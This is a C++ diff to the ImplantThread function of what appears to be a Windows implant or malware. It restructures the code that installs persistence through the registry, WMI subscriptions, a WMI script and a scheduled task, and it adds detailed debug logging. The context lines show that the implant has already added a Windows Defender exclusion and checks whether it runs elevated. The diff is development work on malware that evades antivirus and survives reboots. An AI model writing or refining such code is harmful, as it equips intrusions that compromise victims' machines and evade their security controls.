@@ -95,17 +95,29 @@ DWORD WINAPI ImplantThread(LPVOID) {
     }
     DBG("defender exclusion done, elevated=%d", (int)IsElevated());
 
-    try {
-        InstallRegistryPersistence(exePath);
-        if (!IsWmiPersistenceInstalled()) {
-            InstallWmiPersistence(exePath);
-            InstallWmiScriptPersistence(exePath);
-        }
-        if (!IsScheduledTaskInstalled()) {
-            InstallScheduledTaskPersistence(exePath);
-        }
-    } catch(...) {
-        DBG("Persistence EXCEPTION (non-fatal)");
+    DBG("persistence: registry start");
+    try { InstallRegistryPersistence(exePath); } catch(...) { DBG("registry EXCEPTION"); }
+    DBG("persistence: registry done");
+    DBG("persistence: WMI check start");
+    bool wmiInstalled = false;
+    try { wmiInstalled = !!IsWmiPersistenceInstalled(); } catch(...) { DBG("WMI check EXCEPTION"); }
+    DBG("persistence: WMI installed=%d", (int)wmiInstalled);
+    if (!wmiInstalled) {
+        DBG("persistence: InstallWmiPersistence start");
+        try { InstallWmiPersistence(exePath); } catch(...) { DBG("InstallWmiPersistence EXCEPTION"); }
+        DBG("persistence: InstallWmiPersistence done");
+        DBG("persistence: InstallWmiScriptPersistence start");
+        try { InstallWmiScriptPersistence(exePath); } catch(...) { DBG("InstallWmiScriptPersistence EXCEPTION"); }
+        DBG("persistence: InstallWmiScriptPersistence done");
+    }
+    DBG("persistence: schtask check start");
+    bool taskInstalled = false;
+    try { taskInstalled = !!IsScheduledTaskInstalled(); } catch(...) { DBG("schtask check EXCEPTION"); }
+    DBG("persistence: schtask installed=%d", (int)taskInstalled);
+    if (!taskInstalled) {
+        DBG("persistence: InstallScheduledTaskPersistence start");
+        try { InstallScheduledTaskPersistence(exePath); } catch(...) { DBG("InstallScheduledTaskPersistence EXCEPTION"); }
+        DBG("persistence: InstallScheduledTaskPersistence done");
     }
     DBG("persistence done");
 
